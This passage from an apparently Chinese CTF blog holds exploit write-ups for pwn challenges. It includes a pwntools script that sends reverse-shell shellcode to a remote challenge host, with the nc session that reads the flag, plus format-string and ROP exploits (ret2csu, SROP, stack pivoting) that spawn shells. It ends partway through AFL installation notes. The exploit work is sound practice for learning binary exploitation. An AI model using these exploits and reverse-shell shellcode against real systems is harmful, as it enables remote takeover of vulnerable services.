说呢，reverse_tcp的方法需要我们在一台攻击服务器上打开一个监听端口（使用nc），payload在受害者机器上执行的时候，根据ip地址和端口来连接该攻击服务器，将信息传送给攻击者。而bind_tcp是指在受害者机器上开一个端口，然后攻击者连过去，如果受害者机器开了防火墙，这种方法就不会成功。因此，大多数时候我们都使用reverse_tcp。\n\n参考[nc工具使用](https://www.cnblogs.com/zhaijiahui/p/9028402.html)，附加一个nc/telnet实现服务端/客户端连接的例子。\n\n```shell\n#服务端\n#需要设置好监听端口的防火墙规则，否则其他机器无法建立连接\nnc -p 33x -l -vv\n#客户端\ntelnet 1xx.1xx.xx.xxx 33x\n```\n\n# 3 EXP\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n\nmyelf = ELF('./dagongren1')\n# 本地调试\n# myproc = process(myelf.path)\n# 打远程\nmyproc = remote(\"81.70.209.171\",51601)\n\nafter_bss = 0x600f0f\nscanf_gdt = 0x4006fc\n\npayload1 = 'c' * 0x20\npayload1 += p64(after_bss)\npayload1 += p64(scanf_gdt)\n\n# port - 33x,ip - 14x.12x.5x.1x\n# 这里需要换成自己服务器的地址和ip哦，记得对应端口设置防火墙规则\n# PORT端口号对应的十六进制\nPORT = '\\x8x\\x4x'\n# IPADDR对应的十六进制，通过'.'号分隔\nIPADDR = '\\x33\\x33\\x33\\x33'\nshellcode = \"\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x6a\"\nshellcode += \"\\x02\\x5f\\x6a\\x01\\x5e\\x6a\\x06\\x5a\\x6a\\x29\\x58\\x0f\\x05\\x49\\x89\\xc0\"\nshellcode += \"\\x48\\x31\\xf6\\x4d\\x31\\xd2\\x41\\x52\\xc6\\x04\\x24\\x02\\x66\\xc7\\x44\\x24\"\nshellcode += \"\\x02\"+ PORT + \"\\xc7\\x44\\x24\\x04\" + IPADDR + \"\\x48\\x89\\xe6\\x6a\\x10\"\nshellcode += \"\\x5a\\x41\\x50\\x5f\\x6a\\x2a\\x58\\x0f\\x05\\x48\\x31\\xf6\\x6a\\x03\\x5e\\x48\"\nshellcode += \"\\xff\\xce\\x6a\\x21\\x58\\x0f\\x05\\x75\\xf6\\x48\\x31\\xff\\x57\\x57\\x5e\\x5a\"\nshellcode += \"\\x48\\xbf\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xef\\x08\\x57\\x54\"\nshellcode += \"\\x5f\\x6a\\x3b\\x58\\x0f\\x05\"\n\npayload2 = 'a'*0x20\npayload2 += 'bbbbbbbb'\npayload2 += p64(after_bss + 0x10)\npayload2 += shellcode\n\nmyproc.recvuntil(\"Come On\")\n# break at main -> leave;ret;\n# gdb.attach(myproc,\"b *0x400735\")\nmyproc.sendline(payload1)\nmyproc.sendline(payload2)\n\nmyproc.interactive()\n```\n\n结果：\n\n- 服务端\n\n```shell\nroot@iZt4n6o5h5zjwhe2ubl2uqZ:~# nc -p 33x -l -vv\nListening on [0.0.0.0] (family 0, port 33x)\nConnection from 81.70.209.171 51786 received!\nls\nbin\ndev\nflag\nlib\nlib32\nlib64\nlibx32\npwn\ncat flag\n\nHITCTF2020{4957306aaa6ff77d77c310f5379addf7}\n```\n\n- 本地\n\n```shell\nbling@bling:~/Desktop$ python poc.py \n[DEBUG] PLT 0x4005a0 puts\n[DEBUG] PLT 0x4005a8 fclose\n[DEBUG] PLT 0x4005b0 alarm\n[DEBUG] PLT 0x4005b8 __libc_start_main\n[DEBUG] PLT 0x4005c0 __gmon_start__\n[DEBUG] PLT 0x4005c8 setvbuf\n[DEBUG] PLT 0x4005d0 __isoc99_scanf\n[*] '/home/bling/Desktop/dagongren1'\n    Arch:     amd64-64-little\n    RELRO:    No RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x400000)\n    RWX:      Has RWX segments\n[+] Opening connection to 81.70.209.171 on port 51601: Done\n[DEBUG] Received 0x13 bytes:\n    'Good morning master'\n[DEBUG] Received 0x3c bytes:\n    00000000  0a 57 6f 72  6b 20 68 61  72 64 20 66  6f 72 20 79  │·Wor│k ha│rd f│or y│\n    00000010  6f 75 72 20  62 6f 73 73  20 74 6f 20  6c 69 76 65  │our │boss│ to │live│\n    00000020  20 61 20 62  65 74 74 65  72 20 6c 69  66 65 21 f0  │ a b│ette│r li│fe!·│\n    00000030  9f 91 80 0a  43 6f 6d 65  20 4f 6e 0a               │····│Come│ On·│\n    0000003c\n[DEBUG] Sent 0x31 bytes:\n    00000000  63 63 63 63  63 63 63 63  63 63 63 63  63 63 63 63  │cccc│cccc│cccc│cccc│\n    *\n    00000020  0f 0f 60 00  00 00 00 00  fc 06 40 00  00 00 00 00  │··`·│····│··@·│····│\n    00000030  0a                                                  │·│\n    00000031\n[DEBUG] Sent 0xa7 bytes:\n    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│\n    *\n    00000020  62 62 62 62  62 62 62 62  1f 0f 60 00  00 00 00 00  │bbbb│bbbb│··`·│····│\n    00000030  48 31 c0 48  31 ff 48 31  f6 48 31 d2  4d 31 c0 6a  │H1·H│1·H1│·H1·│M1·j│\n    00000040  02 5f 6a 01  5e 6a 06 5a  6a 29 58 0f  05 49 89 c0  │·_j·│^j·Z│j)X·│·I··│\n    00000050  48 31 f6 4d  31 d2 41 52  c6 04 24 02  66 c7 44 24  │H1·M│1·AR│··$·│f·D$│\n    00000060  02 8x 4x c7  44 24 04 9x  8x 3x 8x 48  89 e6 6a 10  │··K·│D$··│·3·H│··j·│\n    00000070  5a 41 50 5f  6a 2a 58 0f  05 48 31 f6  6a 03 5e 48  │ZAP_│j*X·│·H1·│j·^H│\n    00000080  ff ce 6a 21  58 0f 05 75  f6 48 31 ff  57 57 5e 5a  │··j!│X··u│·H1·│WW^Z│\n    00000090  48 bf 2f 2f  62 69 6e 2f  73 68 48 c1  ef 08 57 54  │H·//│bin/│shH·│··WT│\n    000000a0  5f 6a 3b 58  0f 05 0a                               │_j;X│···│\n    000000a7\n[*] Switching to interactive mode\n\n[*] Got EOF while reading in interactive\n$  \n```","categories":["CTF"]},{"title":"ctfwiki format string 练习","url":"/2020/11/01/ctfwiki-format-string/","content":"\n# hijack GOT\n\n本题是2016 CCTF 中的pwn3\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('./pwn3')\nmyproc = process(myelf.path)\n\ndef get_1(name):\n    myproc.recvuntil('ftp>')\n    myproc.sendline('get')\n    myproc.recvuntil('get:')\n    myproc.sendline(name)\n    data = myproc.recv()\n    return data\n\ndef put_2(name,content):\n    myproc.recvuntil('ftp>')\n    myproc.sendline('put')\n    myproc.recvuntil('upload:')\n    myproc.sendline(name)\n    myproc.recvuntil('the content:')\n    myproc.sendline(content)\n\ndef dir_3():\n    myproc.recvuntil('ftp>')\n    myproc.sendline('dir')\n\nmyproc.recvuntil('Rainism):')\nmyproc.sendline('rxraclhm')\n\nputs_got = myelf.got['puts']\nlog.warn('#####puts_got addr: 0x%x#####' % puts_got)\ninput1 = '%8$s' + p32(puts_got) + '%7$x'\nput_2('aaaa',input1)\n###\n###gdb.attach(myproc,\"b printf\")\n###\nputs_addr = u32(get_1('aaaa')[:4])\n\nlog.warn('#####puts addr: 0x%x#####' % puts_addr)\n\nputs_libc_offset = 0x5f150\nsys_libc_offset = 0x3a950\n\nlibc_base = puts_addr - puts_libc_offset\nsys_addr = libc_base + sys_libc_offset\n\nlog.warn('#####libc_base addr: 0x%x#####' % libc_base)\nlog.warn('#####sys_addr addr: 0x%x#####' % sys_addr)\n##\npayload = fmtstr_payload(7, {puts_got: sys_addr})\n\nmyproc.sendline('put')\nmyproc.recvuntil('upload:')\nmyproc.sendline(\"/bin/sh;\")\nmyproc.recvuntil('the content:')\nmyproc.sendline(payload)\n\nget_1('/bin/sh;')\n\nmyproc.sendline('dir')\n\nmyproc.interactive()\n```\n\n# hijack retaddr\n\n本题是三个白帽的pwnme_k0\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='amd64',os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./pwnme_k0\")\nmyproc = process(myelf.path)\n\nmyproc.recvuntil(\"Input your username(max lenth:20): \")\nmyproc.sendline(\"name\")\nmyproc.recvuntil(\"Input your password(max lenth:20): \")\npasswd = '%6$p'\nmyproc.sendline(passwd)\n\n##\n##gdb.attach(myproc,\"b *0x400b39\")\n##\nmyproc.recvuntil('>')\nmyproc.sendline(str(1))\nmyproc.recvuntil(\"0x\")\n\ndata = myproc.recvline().strip()\nstack_addr = int(data,16)\nret_stack = stack_addr - 0x38\n\n##将栈上的返回地址覆盖成提权gadget\nmyproc.recvuntil('>')\nmyproc.sendline(str(2))\nmyproc.recvuntil(\"please input new username(max lenth:20): \")\nmyproc.sendline(p64(ret_stack))\nmyproc.recvuntil(\"please input new password(max lenth:20): \")\nmyproc.sendline(\"%2218c%8$hn\")\n\n##\nmyproc.recvuntil('>')\nmyproc.sendline(str(1))\n\nmyproc.interactive()\n```\n\n# 堆上的格式化字符串漏洞\n\n 本题是2015年CSAW中的 contacts\n\n（这个题还没调完，后来有别的事去了，先放一下）\n\n```python\n#coding=utf-8\nfrom pwn import *\n\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('./contacts')\nmyproc = process(myelf.path)\n\ndef Create(c_name,c_phone,c_len,c_desp):\n    myproc.recvuntil('>>> ')\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"Contact info: \")\n    myproc.recvuntil(\"\\tName: \")\n    myproc.sendline(c_name)\n    myproc.recvuntil(\"\\tEnter Phone No: \")\n    myproc.sendline(c_phone)\n    myproc.recvuntil(\"\\tLength of description: \")\n    myproc.sendline(c_len)\n    myproc.recvuntil(\"\\tEnter description:\\n\\t\\t\")\n    myproc.sendline(c_desp)\n\ndef Display():\n    myproc.recvuntil('>>> ')\n    myproc.sendline(str(4))\n    myproc.recvuntil(\"\\tDescription: \")\n\nCreate('aaaaaaaa','1234567891',str(50),'%31$paaaa')\n\nDisplay()\ndata = myproc.recvuntil('aaaa',drop=True)\nlibc_start_main = int(data,16) - 247\nlog.warn(\"a: 0x%x\" % libc_start_main)\nlibc_base = libc_start_main - 0x18550\nlog.warn(\"b: 0x%x\" % libc_base)\nsys_addr = libc_base + 0x3a950\nbinsh_addr = libc_base + 0x15910b\n\n\npayload = flat([sys_addr,'aaaa',binsh_addr,'%6$p%11$pbbbb'])\ngdb.attach(myproc,\"b *0x08048c22\")\nCreate('xxxxxxxx','2342342234',str(50),payload)\nDisplay()\nmyproc.recvuntil(\"\\tDescription: \")\ndata = myproc.recvuntil('bbbb',drop=True)\ndata = data.split('0x')\nprint data\nebp_addr = int(data[1],16)\nheap_addr = int(data[2],16)\n\n#payoad = '%'+str(ebp_addr-4)+'x'+'%6$n'\n#part1 = (ebp_addr-4)/2\n#part2 = ebp_addr-4 -part1\n#payload = '%'+str(part1)+'x%'+str(part2)+'x%6$n'\n\npayload = fmtstr_payload(6,{ebp_addr:heap_addr})\nprint payload\n\nCreate('eeeeeeee','1231231231',str(400),payload)\nDisplay()\n\nmyproc.interactive()\n      +------------+\n      |  tag 0/1   |\n      +------------+v2+76\n      |len of desp |\n      +------------+v2+72\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |   Name     |\n      +------------+ v2+8                     +---------+\n      |   &heap1   |           +--------+     |         |\n      +------------+ v2+4      |  Phone |     |  desp   |\n      |   &heap2   |           |        |     |         |\n      +------------+ v2        +--------+     +---------+\n0x804b0a0                        heap1          heap2\n\n0x804b088   record num\n```\n\n参考wp：\n\nhttp://geeksspeak.github.io/blog/2015/09/21/csaw-2015-pwn250-contacts/\n\nhttps://blog.osiris.cyber.nyu.edu/2015/09/28/csaw-ctf-contacts/\n\nhttps://github.com/osirislab/CTF-Solutions/blob/master/CSAWCTF_2015/2015-10-03-csaw-ctf-contacts.markdown","categories":["CTF"]},{"title":"ctfwiki rop 练习","url":"/2020/10/18/ctfwiki-rop/","content":"\n> 部门要准备十一月份的比赛，我也跟着报了个名。虽然自己的pwn现在还很水，但是想着趁这个机会督促自己一把，花点时间好好练一些题。平时除了练题，还有其他工作上的事要做，所以这个只是简单地把我做过的题目的write up做了个罗列，还木有时间写详细的分析过程啦。不过想想，除了自己可能也没谁会来看，等以后有时间（呵呵呵）了再回过头来整理吧~\n\n# 中级ROP\n\n## 题目1 ret2csu\n\nret2csu主要是利用__libsc_csu_init()函数中的gadget，如下代码片段：\n\n```assembly\n.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j\n.text:0000000000400600                 mov     rdx, r13\n.text:0000000000400603                 mov     rsi, r14\n.text:0000000000400606                 mov     edi, r15d\n.text:0000000000400609                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]\n.text:000000000040060D                 add     rbx, 1\n.text:0000000000400611                 cmp     rbx, rbp\n.text:0000000000400614                 jnz     short loc_400600\n.text:0000000000400616\n.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j\n.text:0000000000400616                 add     rsp, 8\n.text:000000000040061A                 pop     rbx\n.text:000000000040061B                 pop     rbp\n.text:000000000040061C                 pop     r12\n.text:000000000040061E                 pop     r13\n.text:0000000000400620                 pop     r14\n.text:0000000000400622                 pop     r15\n.text:0000000000400624                 retn\n```\n\n将0x40061a至0x400624命名为“片段1”，0x400600至0x400614命名为“片段2”。利用ret2csu时，首先将eip劫持到“片段1”，并通过在栈上提前布置rbx，rbp，r12，r13，r14，r15，达到控制寄存器的目的，再利用片段1中的额retn使程序流转到片段2去执行。片段2中会将r13，r14，r15（低32位）分别用于控制rdx，rsi，edi，如此便能控制64位下的前三个函数参数。紧接着有一条call指令，只要提前将r12控制为目标函数（目标函数地址存放的地址），并将rbx置为0，就可以实现任意函数执行了。后面还有个cmp（提前将rbx设置为0，rbp设置为1）以及一些列pop，提前构造好后，程序会再次运行到最后一行0x400624，此时还可以劫持一次eip，让程序继续执行（如回到main函数）。\n\n这里使用的示例程序是[level5](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5)，分析后，构造的第一次ret2csu状态如下。执行完csu_front（上文中的片段2）后，会继续执行片段1，为了控制最后一行0x400624 retn时的eip，需要在栈上填充0x38字节数据（为了安全执行完0x400616至0x400622之间的代码）。\n\n```\n+--------------------+\n|     csu_front:0x400600\n+--------------------+\n|      r15           |  1\n+--------------------+\n|      r14           |  got_write\n+--------------------+\n|      r13           |  8\n+--------------------+\n|      r12           |  got_write\n+--------------------+\n|      rbp           |  1\n+--------------------+\n|      rbx           |  0\n+--------------------+\n|      ret addr      |  csu_end:0x40061a\n+--------------------+\n|       ebp          |  'aaaaaaaa'\n+--------------------+\n|                    |\n|      'a'*0x80      |\n|                    |\n+--------------------+  buf\n\n```\n\n该题exp如下，用到的libc是我本地ubuntu18.04的：\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./level5\")\nmyproc = process(myelf.path)\n\ncsu_front = 0x400600\ncsu_end = 0x40061a\n\ngot_write = myelf.got['write']\ngot_read = myelf.got['read']\nbss_addr = myelf.bss()\nmain_addr = myelf.symbols['main']\n\ndef ret2csu(rbx,rbp,r12,r13,r14,r15,next_addr):\n    payload = 'a'*0x80  # patch\n    payload += 'deadbeef'   # overwrite ebp\n    payload += p64(csu_end) # overwrite return addr, jump to csu_end\n    payload += p64(rbx)          # set rbx to r15\n    payload += p64(rbp)\n    payload += p64(r12)\n    payload += p64(r13)\n    payload += p64(r14)\n    payload += p64(r15)\n    payload += p64(csu_front)    # jump to csu_front,and exec r12\n    payload += 'a'*0x38     # 2nd csu_end,and jump to next eip\n    payload += p64(next_addr)\n    myproc.send(payload)\n    \n# write(1,got_write,8)\nmyproc.recvuntil(\"Hello, World\\n\")\nret2csu(0,1,got_write,8,got_write,1,main_addr)\nwrite_addr = u64(myproc.recv(8))\n\n# read(0,bss_addr,20)\nmyproc.recvuntil(\"Hello, World\\n\")\nret2csu(0,1,got_read,20,bss_addr,0,main_addr)\n \n# input: p64(exec_addr)+'/bin/sh\\x00'\nlibc_base = write_addr - 0x110250\nexec_addr = libc_base + 0xe4e90\nbss_data = p64(exec_addr) + \"/bin/sh\\x00\"\nmyproc.send(bss_data)\n\n# execve(\"/bin/sh\",null,null)\nmyproc.recvuntil(\"Hello, World\\n\")\nret2csu(0,1,bss_addr,0,0,bss_addr+8,main_addr)\n\n#gdb.attach(myproc)\n#log.warn(\"write addr is : 0x%x\" % write_addr)\nmyproc.interactive()\n```\n\n## 题目2 ret2reg\n\n## 题目3 BROP\n\n\n\n# 高级 ROP\n\n## 题目1 ret2_dl_runtime_resolve\n\n_dl_runtime_resolve: https://www.jianshu.com/p/57f6474fe4c6\n\n深入了解GOT,PLT和动态链接: https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html\n\n以上结合https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/ 可以写一篇笔记记录一下。免得以后忘记。\n\n练习题目我的wp：\n\n```python\n#coding=utf-8\nfrom pwn import *\n\ncontext(arch=\"i386\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./main\")\nmyrop = ROP(\"./main\")\nmyproc = process(myelf.path)\n\nbss_addr = myelf.bss()\nnew_esp = bss_addr + 0x500\n\nmyrop.raw('a'*112)\nmyrop.read(0,new_esp,100)\nmyrop.migrate(new_esp)\n#log.warn(\"myrop is : %s\" % myrop.dump())\n\nmyproc.recvuntil(\"Welcome to XDCTF2015~!\\n\")\nmyproc.sendline(myrop.chain())\n\n#myrop2 = ROP(\"./main\")\n#sh = \"/bin/sh\"\n#myrop2.write(1,new_esp+80,len(sh))\n#myrop2.raw('b'*(80 - len(myrop2.chain())))\n#myrop2.raw(sh)\n#myrop2.raw('a'*(100 - len(myrop2.chain())))\n##log.warn(\"myrop is : %s\" % myrop2.dump())\n#myproc.sendline(myrop2.chain())\n#myproc.interactive()\n\n#myrop2 = ROP(\"./main\")\n#sh =\"/bin/sh\"\n#plt_addr = myelf.get_section_by_name('.plt').header.sh_addr\n#write_index = (myelf.plt['write'] - plt_addr)/16 -1\n#patch_wt_ret = 'aaaa'\n#myrop2.raw(plt_addr)\n#myrop2.raw(write_index*8)\n#myrop2.raw(patch_wt_ret)\n#myrop2.raw(1)\n#myrop2.raw(new_esp+80)\n#myrop2.raw(len(sh))\n#myrop2.raw('b'*(80 - len(myrop2.chain())))\n#myrop2.raw(sh)\n#myrop2.raw('b'*(100 - len(myrop2.chain())))\n#\n#myproc.sendline(myrop2.chain())\n#myproc.interactive()\n#\n\nmyrop2 = ROP('./main')\nsh = \"/bin/sh\"\nplt_addr = myelf.get_section_by_name('.plt').header.sh_addr\nrel_plt = myelf.get_section_by_name('.rel.plt').header.sh_addr\n\nwrite_got = myelf.got['write']\nr_info = 0x607\n\nfake_index = new_esp + 24 - rel_plt\n\nmyrop2.raw(plt_addr)\nmyrop2.raw(fake_index)\nmyrop2.raw('aaaa')\nmyrop2.raw(1)\nmyrop2.raw(new_esp+80)\nmyrop2.raw(len(sh))\nmyrop2.raw(write_got)\nmyrop2.raw(r_info)\nmyrop2.raw('b'*(80-len(myrop2.chain())))\nmyrop2.raw(sh)\nmyrop2.raw('b'*(100-len(myrop2.chain())))\nmyproc.sendline(myrop2.chain())\nmyproc.interactive()\n```\n\n\n\n## 题目2 SROP\n\nhttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop\n\n拓展：https://bbs.pediy.com/thread-258047.htm\n\n练习题目我的wp：\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./smallest\")\nmyproc = process(myelf.path)\n\nret_start = 0x4000b0\nret_syscall = 0x4000be\n\n# read(0,&rsp,0x400); read(1,&rsp,0x400)\npayload1 = p64(ret_start)*3\nmyproc.send(payload1)\nmyproc.send('\\xb3')\nstack_addr = u64(myproc.recv()[8:16])\nlog.warn(\"stack_addr is: 0x%x\" % stack_addr)\n\n#read(0,&rsp,0x400)\nsigframe = SigreturnFrame()\nsigframe.rax = constants.SYS_read\nsigframe.rip = ret_syscall\nsigframe.rdi = 0\nsigframe.rsi = stack_addr\nsigframe.rdx = 0x400\nsigframe.rsp = stack_addr\n\npayload1 = p64(ret_start) + 'a'*8 + str(sigframe)\npayload2 = p64(ret_syscall) + 'a'*7\nmyproc.send(payload1)\nmyproc.send(payload2)\n\n# new stack - we know the addr\nsigframe = SigreturnFrame()\nsigframe.rax = constants.SYS_execve\nsigframe.rip = ret_syscall\nsigframe.rdi = stack_addr + 0x150\nsigframe.rsi = 0x0\nsigframe.rdx = 0x0\nsigframe.rsp = stack_addr\n\npayload1 = p64(ret_start) + 'a'*8 + str(sigframe)\n#log.warn(\"len: 0x%x \" % len(payload1))\npayload = payload1 + 'a'*(0x150 - len(payload1)) + \"/bin/sh\\x00\"\n\npayload2 = p64(ret_syscall) + 'a'*7\nmyproc.send(payload)\nmyproc.send(payload2)\n\nmyproc.interactive()\n```\n\n## 题目3 ret2VDSO\n\n\n\n# ROP Tricks\n\n## 题目1 stack pivoting\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\nmyelf = ELF('./b0verfl0w')\nmyproc = process(myelf.path)\n\noffset = 36\n\n#shellcode_x86 = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\"\n#shellcode_x86 += \"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\"\n#shellcode_x86 += \"\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\"\n#shellcode_x86 += \"\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\"\n\nshellcode_x86 = \"\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\"\n\npayload = shellcode_x86 + 'a'*(36- len(shellcode_x86)) + p32(0x08048504)\npayload += asm('sub esp,40;jmp esp') \n\nmyproc.recvuntil(\"What's your name?\")\nmyproc.sendline(payload)\n\nmyproc.interactive()\n```\n\n## 题目2 frame faking\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\nmyelf = ELF('./over.over')\nmyproc = process(myelf.path)\nmylibc = myelf.libc\n\noffset = 0x58\ntotal_len = 0x60\n\n##leak stack\npayload = 'a'*0x50\nmyproc.recvuntil('>')\nmyproc.send(payload)\nprev_rbp = u64(myproc.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))\nlog.warn('recieved: 0x%x' % prev_rbp)\n\n##leak libc,puts(&got_puts)\npop_rdi_ret = 0x400793\nrbp1 = prev_rbp-0x20-0x50\nending = 0x4006be\nleak_libc_chain = 'a'*8+p64(pop_rdi_ret)+p64(myelf.got['puts'])+p64(myelf.plt['puts'])+p64(0x400676)\npayload1 = leak_libc_chain+(0x50-len(leak_libc_chain))*'a'+p64(rbp1)+p64(ending)\nmyproc.recvuntil('>')\nmyproc.send(payload1)\nleak_puts = u64(myproc.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))\nlog.warn('recieved: 0x%x' % leak_puts)\nlog.warn('mylibc.sym: 0x%x' % mylibc.sym['puts'])\nlibc_base = leak_puts - mylibc.sym['puts']\nlog.warn('libc_base: 0x%x' % libc_base)\n\n## get shell,execve(\"/bin/sh\\x00\",null,null)\npop_rdx_rsi_ret = libc_base + 0x115189\nexec_addr = libc_base + mylibc.sym['execve']\nbin_sh = libc_base + next(mylibc.search(\"/bin/sh\"))\nrbp2 = prev_rbp-0x20-0x50-0x30\n\nexec_chain = flat(['a'*8,p64(pop_rdx_rsi_ret),p64(0),p64(0),p64(pop_rdi_ret),p64(bin_sh),p64(exec_addr)])\npayload2 = exec_chain + (0x50-len(exec_chain))*'a' + p64(rbp2) + p64(ending)\nmyproc.recvuntil('>')\nmyproc.send(payload2)\n\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\n## 题目3 Stack smash\n\n2015年32c3 ctf readme\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf = ELF('./readme.bin')\nmyproc = process(myelf.path)\n\nargv0_addr = 0x7fffffffdda8\nname_addr = 0x7fffffffdb90\nbackup_string = 0x400d21\npayload = 'a'*(argv0_addr-name_addr) + p64(backup_string)\n\nmyproc.recvuntil(\"Hello!\\nWhat's your name? \")\nmyproc.sendline(payload)\nmyproc.recvuntil(\"Please overwrite the flag: \")\nmyproc.sendline('aaa')\nmyproc.recv()\nmyproc.interactive()\n```\n\n## 题目4 栈上的partial overwrite\n\n### 2018-安恒杯-babypie\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n\nmyelf = ELF('./babypie')\nmyproc = process(myelf.path)\n\npayload1 = 'a'*(0x28+1)\n\n#leak canary\nmyproc.recvuntil(\"Input your Name:\")\nmyproc.send(payload1)\nmyproc.recvuntil('a'*0x29)\ncanary = u64('\\x00' + myproc.recv(7))\n\n#overwrite 1 byte\npayload2 = 'a'*0x28 + p64(canary) + 'a'*0x8 + '\\x3E'\n\nmyproc.recvuntil(\":\\n\")\nmyproc.send(payload2)\n\nmyproc.interactive()\n```\n\n\n\n### 2018-XNUCA-gets\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n\nfor i in range(0x1000): \n    myelf = ELF('./gets')\n    myproc = process(myelf.path)\n    try:\n        payload = 'a'*24 + p64(0x40059b)\n        payload += 'aaaaaaaa'*5 + p64(0x40059b)\n        payload += 'aaaaaaaa'*5 + p64(0x40059b)\n        payload += 'a' * 8 * 5 + '\\x26\\x02'\n        myproc.sendline(payload)\n        myproc.sendline('ls')\n        data = myproc.recv()\n        print data\n        myproc.interactive()\n        myproc.close()\n    except Exception:\n        myproc.close()\n        continue\n```","categories":["CTF"]},{"title":"afl","url":"/2020/06/30/afl/","content":"\n# 1 从一个test程序开始\n\n## 1.1 安装AFL\n\n首先，检查本地的clang和llvm是否安装，若未安装则安装一下\n\n```shell\nsudo apt-get install clang\nsudo apt-get install llvm\n```\n\n以上环境确认好后，下载并安装AFL\n\n```shell\nwget http://lcamtuf.coredump.cx/afl/releases/afl-2.52b.tgz\ntar -zxvf afl-2.52b.tgz\ncd afl-2.52b\nmake\nsudo make install\n```\n\n以上操作做完，AFL就算是安装完毕啦。现在来看看AFL安装前后代码目录中文件的差别。以下先是安装前的目录：\n\n```shell\ndrwxr-xr-x 10  500  500   4096 Nov  5  2017 .\ndrwxr-xr-x  3 root root   4096 Jun  2 09:49 ..\n-rw-r--r--  1  500  500  23755 Nov  5  2017 afl-analyze.c\n-rw-r--r--  1  500  500  15273 Nov  5  2017 afl-as.c\n-rw-r--r--  1  500  500  21090 Nov  5  2017 afl-as.h\n-rwxr-xr-x  1  500  500  11392 Nov  5  2017 afl-cmin\n-rw-r--r--  1  500  500 206076 Nov  5  2017 afl-fuzz.c\n-rw-r--r--  1  500  500   8597 Nov  5  2017 afl-gcc.c\n-rw-r--r--  1  500  500   5336 Nov  5  2017 afl-gotcpu.c\n-rwxr-xr-x  1  500  500   4913 Nov  5  2017 afl-plot\n-rw-r--r--  1  500  500  16527 Nov  5  2017 afl-showmap.c\n-rw-r--r--  1  500  500  25235 Nov  5  2017 afl-tmin.c\n-rwxr-xr-x  1  500  500   3655 Nov  5  2017 afl-whatsup\n-rw-r--r--  1  500  500  12565 Nov  5  2017 alloc-inl.h\n-rw-r--r--  1  500  500  11216 Nov  5  2017 config.h\n-rw-r--r--  1  500  500   6574 Nov  5  2017 debug.h\ndrwxr-xr-x  2  500  500   4096 Nov  5  2017 dictionaries\ndrwxr-xr-x  4  500  500   4096 Nov  5  2017 docs\ndrwxr-xr-x 12  500  500   4096 Nov  5  2017 experimental\n-rw-r--r--  1  500  500   2065 Nov  5  2017 hash.h\ndrwxr-xr-x  2  500  500   4096 Nov  5  2017 libdislocator\ndrwxr-xr-x  2  500  500   4096 Nov  5  2017 libtokencap\ndrwxr-xr-x  2  500  500   4096 Nov  5  2017 llvm_mode\n-rw-r--r--  1  500  500   6987 Nov  5  2017 Makefile\ndrwxr-xr-x  3  500  500   4096 Nov  5  2017 qemu_mode\nlrwxrwxrwx  1  500  500     24 Nov  5  2017 QuickStartGuide.txt -> docs/QuickStartGuide.txt\nlrwxrwxrwx  1  500  500     11 Nov  5  2017 README -> docs/README\ndrwxr-xr-x  6  500  500   4096 Nov  5  2017 testcases\n-rw-r--r--  1  500  500    789 Nov  5  2017 test-instr.c\n-rw-r--r--  1  500  500   2292 Nov  5  2017 types.h\n```\n\n安装完成后，代码目录中的文件\n\n```shell\ndrwxr-xr-x 10  500  500   4096 Jun  2 09:47 .\ndrwxr-xr-x  7 root root   4096 Jun  1 18:42 ..\n-rwxr-xr-x  1 root root  90792 Jun  2 09:46 afl-analyze\n-rw-r--r--  1  500  500  23755 Nov  5  2017 afl-analyze.c\n-rwxr-xr-x  1 root root  50808 Jun  2 09:46 afl-as\n-rw-r--r--  1  500  500  15273 Nov  5  2017 afl-as.c\n-rw-r--r--  1  500  500  